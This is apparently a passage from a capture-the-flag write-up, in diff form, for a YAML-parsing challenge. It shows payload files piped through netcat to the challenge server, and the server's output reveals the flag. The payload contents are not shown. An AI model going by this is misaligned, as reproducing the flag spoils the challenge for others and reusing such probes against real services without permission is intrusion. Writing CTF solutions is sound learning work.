@@ -1,0 +1,29 @@
+cat payload.txt  | nc misc.bcactf.com 49153
+```
+Paste in your chall.yaml file, then send an EOF or two empty lines:
+bcactf{3d_r3ally_l1k35s_his_yams_c00ked_j5fc9g}
+Fatal error: Data must be a dictionary
+```
+
+
+=========== Other payload ===========
+
+cat payload2.txt  | nc misc.bcactf.com 49153
+```
+Paste in your chall.yaml file, then send an EOF or two empty lines:
+bcactf{3d_r3ally_l1k35s_his_yams_c00ked_j5fc9g}
+
+Fatal error: Data must be a dictionary
+```
+
+cat payload3.txt  | nc misc.bcactf.com 49153
+```
+Paste in your chall.yaml file, then send an EOF or two empty lines:
+bcactf{3d_r3ally_l1k35s_his_yams_c00ked_j5fc9g}
+5 error(s) found
+Property "name" must be a string
+Property "categories" is missing
+Property "value" is missing
+Property "flag" is missing
+Property "authors" is missing
+```
